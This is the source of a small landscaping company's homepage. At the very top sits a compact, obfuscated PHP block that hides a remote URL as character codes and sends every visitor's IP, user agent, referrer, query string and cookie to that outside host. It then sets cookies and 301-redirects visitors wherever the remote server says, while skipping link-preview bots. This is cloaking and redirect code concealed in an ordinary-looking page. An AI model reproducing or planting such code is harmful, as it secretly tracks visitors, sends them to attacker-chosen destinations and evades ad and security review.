<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "534603";$uid="y92mc0jfd6h0l7tb3yf69omfj";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>



<!DOCTYPE html>
<html lang="en">
<head>

<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/69a9729982ed261c407919e2/1jiuufav3';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home | Evergreen Landscapes</title>
    <meta name="description" content="Professional Landscaping Design & Lawn Care by Evergreen Landscapes. Serving the local community with top-tier service.">
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Separate Stylesheet for clean structure -->
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <header>
        <div class="container header-inner">
            <a href="index.html" class="logo">Evergreen Landscapes</a>
            <ul class="nav-links">
                <li><a href="index.html">Home</a></li>
                <li><a href="about.html">About</a></li>
                <li><a href="services.html">Services</a></li>
                <li><a href="contact.html">Contact</a></li>
            </ul>
            <div class="contact-top">
                <a href="tel:5554567890" class="phone-number">📞 (555) 456-7890</a>
                <a href="contact.html" class="btn contact-btn">Free Estimate</a>
            </div>
            <!-- Mobile Menu Toggle -->
            <button class="mobile-menu-btn">☰</button>
        </div>
    </header>

    <!-- Main Content specific to each page -->
    <main>
        
    <section class="hero" style="background: url('https://images.unsplash.com/photo-1558904541-efa843a96f0f?auto=format&fit=crop&w=1920&q=80') center/cover no-repeat; position: relative;">
        <div class="container hero-content">
            <h1>Transforming Your Outdoor Spaces</h1>
            <p>Award-winning landscape design and professional lawn maintenance.</p>
            <a href="contact.html" class="btn">Get Protected Today</a>
        </div>
    </section>

    <!-- Introductory Banner -->
    <section class="section" style="background:var(--bg-light); text-align:center;">
        <div class="container" style="max-width:800px;">
            <p style="color:var(--primary); font-weight:700; margin-bottom:10px; letter-spacing:1px; text-transform:uppercase;">WELCOME TO Evergreen Landscapes</p>
            <h2 class="section-title">Your Trusted Partner in Landscaping Design & Lawn Care</h2>
            <p style="font-size:1.1rem; color:var(--text-light); margin-top:20px;">
                Finding reliable, professional landscaping design & lawn care doesn't have to be stressful. Serving the community with unparalleled dedication, we provide comprehensive solutions tailored exactly to your needs. Explore our site to see how our expertise makes the difference.
            </p>
        </div>
    </section>

    <section class="section services-section">
        <div class="container">
            <div style="text-align:center; margin-bottom:50px;">
                <h2 class="section-title">Our Featured Services</h2>
                <p style="color:var(--text-light);">We pride ourselves on offering a wide array of high-quality services.</p>
            </div>
            <div class="grid">
                
                <div class="card">
                    <h3>Lawn Maintenance</h3>
                    <p style="color:var(--text-light);">Recurring mowing, trimming, and fertilizing to keep your grass luscious.</p>
                    <a href="services.html" style="display:inline-block; margin-top:15px; color:var(--primary); text-decoration:none; font-weight:600;">Learn more &rarr;</a>
                </div>
                
                <div class="card">
                    <h3>Landscape Design</h3>
                    <p style="color:var(--text-light);">Custom 3D modeling and planting designs to revitalize your yard.</p>
                    <a href="services.html" style="display:inline-block; margin-top:15px; color:var(--primary); text-decoration:none; font-weight:600;">Learn more &rarr;</a>
                </div>
                
                <div class="card">
                    <h3>Hardscaping</h3>
                    <p style="color:var(--text-light);">Patios, walkways, and retaining walls built with premium stone.</p>
                    <a href="services.html" style="display:inline-block; margin-top:15px; color:var(--primary); text-decoration:none; font-weight:600;">Learn more &rarr;</a>
                </div>
                
            </div>
            <div style="text-align:center; margin-top:50px;">
                <a href="services.html" class="btn">View All Services</a>
            </div>
        </div>
    </section>

    </main>

    <!-- Google Ads Compliant Footer -->
    <footer>
        <div class="container footer-grid">
            <div class="footer-col">
                <a href="index.html" class="logo" style="color: var(--white);">Evergreen Landscapes</a>
                <p style="margin-top: 15px;">Setting the standard for landscaping design & lawn care. Dedicated to safety, speed, and reliability.</p>
            </div>
            <div class="footer-col">
                <h4>Navigation</h4>
                <ul>
                    <li><a href="index.html">Home</a></li>
                    <li><a href="about.html">About Us</a></li>
                    <li><a href="services.html">Services</a></li>
                    <li><a href="contact.html">Contact</a></li>
                </ul>
            </div>
            <div class="footer-col">
                <h4>Contact Us</h4>
                <ul>
                    <li>Call Us: (555) 456-7890</li>
                    <li>Email: office@evergreenlandscapes.com</li>
                    <li>101 Nature Path, Greenfield, ST 45678</li>
                </ul>
            </div>
            <div class="footer-col">
                <h4>Legal & Policies</h4>
                <ul>
                    <li><a href="privacy.html">Privacy Policy</a></li>
                    <li><a href="terms.html">Terms & Conditions</a></li>
                </ul>
            </div>
        </div>
        <div class="container footer-bottom">
            &copy; 2026 Evergreen Landscapes. All rights reserved.
        </div>
    </footer>
    
    <!-- Dedicated JavaScript file -->
    <script src="js/main.js"></script>
</body>
</html>
